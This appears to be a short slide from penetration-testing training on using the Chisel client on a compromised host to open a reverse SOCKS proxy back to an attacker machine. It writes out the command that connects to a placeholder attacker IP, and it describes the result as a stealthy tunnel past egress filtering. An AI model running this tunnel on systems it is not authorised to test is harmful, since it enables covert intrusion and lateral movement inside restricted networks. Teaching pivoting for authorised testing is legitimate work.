Chisel: Reverse SOCKS Proxy

Connecting the Client from the Compromised Host

Client Operation

  • Client connects back to your attacker machine (reverse connection).
  • Bypasses common egress filtering rules.
  • Establishes a SOCKS proxy on your attacker machine (default `localhost:1080`).
  • Enables full network access through the pivot.
Key Takeaway

The Chisel client establishes a reverse SOCKS proxy, providing a robust and stealthy tunnel back to your attacker machine, even in restrictive network environments.

Chisel Client Command
# On the compromised PivotHost:
./chisel client YOUR_ATTACKER_IP:8000 R:socks

# Explanation of parameters:
client: Specifies Chisel should run in client mode.
YOUR_ATTACKER_IP:8000: The address and port of your Chisel server.
R:socks: Instructs the client to create a reverse SOCKS proxy.

# After connection, a SOCKS proxy will be available on your attacker machine at localhost:1080.
